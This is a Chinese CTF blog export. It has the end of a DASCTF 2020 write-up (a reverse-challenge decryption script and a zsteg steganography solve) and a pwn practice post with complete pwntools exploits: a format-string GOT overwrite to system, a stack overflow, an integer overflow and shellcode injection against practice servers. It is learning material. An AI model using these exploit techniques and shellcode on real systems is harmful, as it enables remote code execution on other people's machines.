class="number">0x05</span>, <span class="number">0x1D</span>, <span class="number">0xEF</span>, <span class="number">0x0B</span>, <span class="number">0x23</span>, <span class="number">0x11</span>, <span class="number">0x37</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0xBB</span>, <span class="number">0x17</span>, <span class="number">0xD2</span>, <span class="number">0xB3</span>, <span class="number">0xDE</span>, <span class="number">0x2C</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x61</span>, <span class="number">0xCB</span>, <span class="number">0xAD</span>, <span class="number">0x9A</span>, <span class="number">0xA4</span>, <span class="number">0xF3</span>, <span class="number">0x0A</span>, <span class="number">0xA0</span>, <span class="number">0x14</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0x92</span>, <span class="number">0x0D</span>, <span class="number">0x5E</span>, <span class="number">0xA9</span>, <span class="number">0xD5</span>, <span class="number">0x90</span>, <span class="number">0x96</span>, <span class="number">0x6F</span>, <span class="number">0x36</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0x76</span>, <span class="number">0x45</span>, <span class="number">0xDA</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0x0F</span>, <span class="number">0xB6</span>, <span class="number">0x34</span>, <span class="number">0x3A</span>, </span><br><span class="line">  <span class="number">0xDD</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xAC</span>, <span class="number">0xFB</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x27</span>, <span class="number">0x13</span>, <span class="number">0x93</span>, </span><br><span class="line">  <span class="number">0x87</span>, <span class="number">0x72</span>, <span class="number">0x89</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0x7D</span>, <span class="number">0x06</span>, <span class="number">0x9D</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xE8</span>, <span class="number">0xC2</span>, <span class="number">0x75</span>, <span class="number">0xAE</span>, <span class="number">0xF7</span>, <span class="number">0x97</span>, <span class="number">0x60</span>, <span class="number">0xE1</span>, <span class="number">0xD9</span>, </span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x6E</span>, <span class="number">0x4B</span>, <span class="number">0x31</span>, <span class="number">0xE9</span>, <span class="number">0x43</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v6 = <span class="number">0</span>, v7 = <span class="number">0</span>, v5 = <span class="number">0</span>, ans[<span class="number">37</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">37</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">296</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans[j++] = *(<span class="keyword">long</span> <span class="keyword">int</span> *)(&amp;ida_chars[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v6 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + v6 + <span class="number">1</span>) - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">v5 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v7 + a[v6]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">v7 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(v5 + v7 + a[v6]) - v5;</span><br><span class="line"><span class="keyword">int</span> temp = a[v6];</span><br><span class="line">a[v6] = a[v7];</span><br><span class="line">a[v7] = temp;</span><br><span class="line"></span><br><span class="line">flag[i] = ans[i]^a[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a[v6] + a[v7])];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214751017.png" alt="image-20200626214751017"></p></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h3><p>题目描述：你知道RGBA吗？</p><p>下载后是一张表情包。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/Rgba.png" alt="Rgba"></p><p>从题目的描述与RGB有关，放入Stegsolve中看一下，可以看到在透明的管道隐藏有数据。且题目名称都是透明度。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627094515063.png" alt="image-20200627094515063"></p><p>然后直接提取出透明管道的所有数据，但开始自己复制的数据然后粘贴到一个文件，最后得到的压缩包一直损坏。后面对比发现是每次换行的地方会出问题。</p><p>其实直接save bin 啊</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627094815397.png" alt="image-20200627094815397"></p><p>最后得到的要压缩包根据提示爆破出密码即可：nepnb</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627095017830.png" alt="image-20200627095017830"></p><p>最后其实这个的题使用zesteg可以直接得到压缩包。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627095200352.png" alt="image-20200627095200352"></p><p>再使用<strong>zsteg Rgba.png -e ‘b8,a,lsb,xy’ &gt; 1.zip</strong>提取出压缩包。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn练习</title>
      <link href="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/06/04/pwn%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>pwn的一些练习记录~<a id="more"></a></p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>利用格式化字符串漏洞覆盖got表的典型例题。</p><p>漏洞函数：<br><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20220217112322564.png" alt="image-20220217112322564"></p><p>如上图，可以无限的利用 printf(buf); 的格式化字符串漏洞，那就好很好办了。</p><p>首先测试出输入字符串的偏移量：7</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20220217115234620.png" alt="image-20220217115234620"></p><p>然后泄露出一个libc中的函数地址，以便计算处libc的基地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf_got = elf.got[<span class="string">b'printf'</span>]</span><br><span class="line">p = p32(printf_got)+<span class="string">b'%7$s'</span></span><br><span class="line">real_printf = u32(r(<span class="number">8</span>)[<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">'printf'</span>, real_printf)</span><br><span class="line">libc_addr = real_printf-libc.dump(<span class="string">'printf'</span>)</span><br></pre></td></tr></table></figure><p>接着计算处libc中system的地址，并以此覆盖循环中每次要执行的printf函数的got地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system = libc_addr+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">p1 = fmtstr_payload(<span class="number">7</span>, &#123;printf_got: system&#125;)</span><br></pre></td></tr></table></figure><p>这样覆盖后，以后每次read的内容都会被作为system的参数执行了，也就是可以执行命令了。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ROPgadget --binary xxx | grep ""</span></span><br><span class="line"><span class="string">0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b9 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x, y: log.info(x + <span class="string">': '</span>+<span class="string">'\x1b[01;38;5;214m'</span> + hex(y) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"> </span><br><span class="line">context(os = <span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">local_path = <span class="string">'./pwn1'</span></span><br><span class="line">libc_path = <span class="string">'x86_libc.so.6'</span></span><br><span class="line">addr = <span class="string">''</span>  </span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(arg)</span>:</span></span><br><span class="line">gdb.attach(io, arg)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">is_local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> is_local != <span class="number">0</span>:</span><br><span class="line">    io = process(local_path, close_fds=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(addr, port)</span><br><span class="line">elf = ELF(local_path)</span><br><span class="line"><span class="comment">#libc = ELF(libc_path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">b'printf'</span>]</span><br><span class="line">li(<span class="string">'printf_got'</span>, printf_got)</span><br><span class="line">p = p32(printf_got)+<span class="string">b'%7$s'</span></span><br><span class="line">sla(<span class="string">'input:'</span>, p)</span><br><span class="line">real_printf = u32(r(<span class="number">8</span>)[<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">'printf'</span>, real_printf)</span><br><span class="line">libc_addr = real_printf-libc.dump(<span class="string">'printf'</span>)</span><br><span class="line">li(<span class="string">'libc_addr'</span>, libc_addr)</span><br><span class="line">system = libc_addr+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">li(<span class="string">'system'</span>, system)</span><br><span class="line">p1 = fmtstr_payload(<span class="number">7</span>, &#123;printf_got: system&#125;)</span><br><span class="line"><span class="comment">#print(p1)</span></span><br><span class="line">sl(p1)</span><br><span class="line"><span class="comment">#p2 = b'bin/sh\x00'</span></span><br><span class="line"><span class="comment">#sl(p2)</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="Buu"><a href="#Buu" class="headerlink" title="Buu"></a>Buu</h2><h3 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h3><p>运行程序，输入正确的用户名和密码后程序奔溃，定位到是执行这个函数指针引发的。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20220207171639326.png" alt="image-20220207171639326"></p><p>跟踪这个函数指针的来源：</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20220207171846917.png" alt="image-20220207171846917"></p><p>继续跟踪返回函数指针的函数：</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20220207172134441.png" alt="image-20220207172134441"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20220207172110634.png" alt="image-20220207172110634"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/qdOuNcUwA6mfJt7.png" alt="image-20220207173026899"></p><p>如上图，这个返回值的用法明显是有问题的，它返回了一个数组的首地址，而这个数组是这个函数中的局部变量，在函数执行完会进行堆栈清理，虽然数据内容不会立即清除掉，但调用下一个函数时会在相同的地方开辟堆栈，这就会将我们上一个函数返回的数组内容给覆盖掉。这也是本题存在漏洞的地方，我们在调用下个读取输入的函数的时候，将上一个执行函数赋值的函数指针给覆盖为程序中现有的后门函数。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20220207172848595.png" alt="image-20220207172848595"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ROPgadget --binary xxx | grep ""</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"> </span><br><span class="line">context(os = <span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">local_path = <span class="string">'./login'</span></span><br><span class="line">addr = <span class="string">'node4.buuoj.cn'</span>   </span><br><span class="line">port = <span class="number">25544</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> is_local != <span class="number">0</span>:</span><br><span class="line">    io = process(local_path, close_fds=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(addr, port)</span><br><span class="line">elf = ELF(<span class="string">'./login'</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x400E88</span></span><br><span class="line">p = <span class="string">b'2jctf_pa5sw0rd'</span>.ljust(<span class="number">80</span><span class="number">-8</span>, <span class="string">b"\x00"</span>)+p64(shell)</span><br><span class="line">sla(<span class="string">'username: '</span>, <span class="string">"admin"</span>)</span><br><span class="line">sla(<span class="string">'password: '</span>, p)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><blockquote><p>栈溢出</p></blockquote><p>ida打开看一下。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180206603.png" alt="image-20200604180206603"></p><p>可以知道这个随机数种子我们是不知道的，但是可以直接通过gets(v7)，通过栈溢出把这个种子换成1，再用1计算出随机数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46809</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'a'</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">l = <span class="string">'2542625142'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">p.recvuntil(<span class="string">'input'</span>)</span><br><span class="line">p.sendline(i)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180443703.png" alt="image-20200604180443703"></p><p><strong>总结：对栈更加熟悉。</strong></p><h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><blockquote><p>栈溢出，控制程序走向</p></blockquote><p> 使用checksec看一保护，没有canary。</p><p> ida中看一下，gets()存在溢出，有system()函数，但是字符串不是我们想要的shell。和之前在论剑场做过的很像，只不过那个是64位，这个是32位，参数传递不同而已。</p><p>  <img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605123722286.png" alt="image-20200605123722286"></p><p> 尝试使用 ROPgadget搜索<strong>$0</strong>,无果。但回到程序看到有一个全局变量让我们输入name，那就自己构造。</p><p> 找到system的地址，写py脚本。</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53127</span>)</span><br><span class="line">s = <span class="string">'$0'</span> <span class="comment">#这里也可以'/bin/sh'</span></span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x26</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x0804855A</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>得到shell。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605124200541.png" alt="image-20200605124200541"></p><p><strong>总结：上次是64位，这次体验了32位程序，传参不同。</strong></p><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><blockquote><p>栈溢出，整数溢出</p></blockquote><p>没有开启canary，在ida中可以看到第一个login函数都不存在溢出。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161502591.png" alt="image-20200605161502591"></p><p>但从搜索的字符串找到引用，有一个system(“cat flag”)，所以还是考虑通过栈溢出控制程序走向。</p><p>果然在<strong>check_passwd（&amp;buf）</strong>存在栈溢出，这里就是多了个整数溢出。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161944323.png" alt="image-20200605161944323"></p><p>由于一个字节无符号的范围（0-255），那我们最小只要260就可以让v3==4即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54696</span>)</span><br><span class="line">payload = (<span class="number">0x14</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x08048694</span>) + (<span class="number">260</span><span class="number">-28</span>)*<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'passwd:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605163357042.png" alt="image-20200605163357042"></p><p><strong>总结：对整数溢出有了了解。</strong></p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><blockquote><p>格式化字符换漏洞，写入shellcode。但是有很多逻辑干扰，关键还是分析到强制转化为函数到执行，联系到执行自己的shellcode。</p></blockquote><p>程序除了基址随机化保护关了，其他全开。</p><p>载入ida找漏洞，感觉有点复杂，一个小游戏，函数有点多。但是由于没有关键字符串与system（）函数，这时候就可以往写shellcode方面想。果然在<strong>sub_400CA6((_DWORD *)a1);</strong>中找到了。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605203928195.png" alt="image-20200605203928195"></p><p>但要使整个函数执行，上面有个判断，<strong>*a1 == a1[1]</strong>，寻找*a1的参数来源，可以知道使main()函数里的v4。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605221940761.png" alt="image-20200605221940761"></p><p>这时候看有没有地方可以让着2个数相等。还有2个关键函数仔细看的。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222351181.png" alt="image-20200605222351181"></p><p>进入<strong>sub_400A7D()</strong>，直接输入east跳过就好了。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222611543.png" alt="image-20200605222611543"></p><p>再看<strong>sub_400BB9()</strong>,正好这里有这个漏洞，且有提示信息。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605224545388.png" alt="image-20200605224545388"></p><p>下面用gdb调试看看v2的值在第几个参数位置。在printf()处下断点。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605225102222.png" alt="image-20200605225102222"></p><p>但是注意这是64位程序，先是使用6个寄存器传递参数（rdi, rsi, rdx, rcx, r8, r9）,而这里<strong>rdi</strong>作为了格式化字符串的参数，那寄存器还有5个用来传递参数，那我们的改变地址的值就是第(5+2) = 7个参数了。</p><p>开始写脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug' 这个可以将每一步的调试信息反馈给用户。</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46461</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">7</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">'wish is:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%085d%7$n'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>) <span class="comment">#这里shellcode的2中写法。</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">p.recvuntil(<span class="string">'YOU SPELL'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606091645885.png" alt="image-20200606091645885"></p><p><strong>总结：1.shellcode的写法：一：通过shellcraft 一个生成shellcode的类。shellcraft.sh()获得执行system(“/bin/sh”)汇编代码所对应的机器码。二：通过反汇编的shellcode代码。2.对格式化字符串漏洞及64位传参加深了理解。3.分析长的题目。</strong></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><blockquote><p>开始查保护后没注意到NX，在栈上几次没执行成功才回去看到。这个题实际还是栈溢出，但多考了很多知识点，对刚接触pwn收获还是很大。</p></blockquote><p>首先查保护，只开了NX，没有canary，那就可以往靠溢出控制程序走向了的方向看题。</p><p>载入ida后，栈溢出很明显。</p><p> <img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606153058583.png" 